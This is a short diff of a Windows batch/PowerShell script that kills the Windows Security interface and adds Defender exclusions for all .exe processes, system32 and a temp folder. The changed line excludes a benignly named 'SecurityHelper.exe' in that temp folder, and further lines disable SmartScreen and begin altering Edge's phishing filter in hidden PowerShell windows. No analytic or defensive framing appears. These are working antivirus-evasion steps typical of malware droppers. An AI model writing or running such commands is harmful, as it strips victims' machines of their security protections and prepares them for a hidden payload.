@@ -20,7 +20,7 @@ taskkill /f /im SecHealthUI.exe
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v .exe /t REG_SZ /d "1" /reg:64
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v system32 /t REG_SZ /d "1" /reg:64
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v $env:TEMP\MyTempFolder /t REG_SZ /d "1" /reg:64
-Add-MpPreference -ExclusionProcess "SecurityHelper.exe"
+Add-MpPreference -ExclusionProcess "$env:TEMP\MyTempFolder\SecurityHelper.exe"
 timeout /t 1
 PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Type DWord -Value 0"
 PowerShell.exe -WindowStyle Hidden -Command "If (!(Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter')) {New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Force | Out-Null}"
